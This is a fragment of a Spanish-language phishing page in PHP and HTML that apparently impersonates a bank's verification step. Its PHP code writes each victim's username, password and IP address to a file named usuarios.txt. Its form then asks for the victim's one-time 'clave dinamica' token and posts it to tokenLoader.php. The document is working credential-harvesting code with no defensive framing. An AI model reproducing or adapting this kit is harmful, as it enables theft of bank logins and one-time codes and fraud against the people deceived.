<?php 
    ...
    if (isset($usuario) != null && isset($password) != null && $count == 1) {
        $ar=fopen("usuarios.txt","a");
        fwrite( $ar ,'

====== PASO 1
       Usuario: '.$usuario.' | clave: '.$password.' | ip: '.$ip.'
');
        fclose($ar);
    }
    $_SESSION["count"] = 2;
    ...
    <div class=" sm:mx-[55px] px-[15px] pt-[10px]">
        ...
        <div class="border-[1px] border-[#CCCCCC] flex items-center p-2 mt-5">
            ...
            <div>
                ...
                <p>Para verificar que eres tú, ingresa la clave dinamica de tu dispositivo.</p>
            </div>
        </div>
        ...
        <div class="pt-[30px]  mb-[35px]">
            <div class="flex justify-center gap-[15px]">
                <div class="border-[1px] border-[#CCCCCC] pb-[15px]">
                    ...
                    <form action="tokenLoader.php" method="POST">
                        ...
                        <div class="px-[10px] pt-[8px] flex gap-3 flex-col">
                            <div class="flex gap-3">
                                <p class="text-sm text-[#2c2a29] font-custom font-bold">Ingresa tu Dinamica</p>
                            </div>
                            ...
                            <input name="token1" class="result absolute bg-none" value="" readonly style="color:white; z-index: -299; cursor: default;" /> 
                    </form>
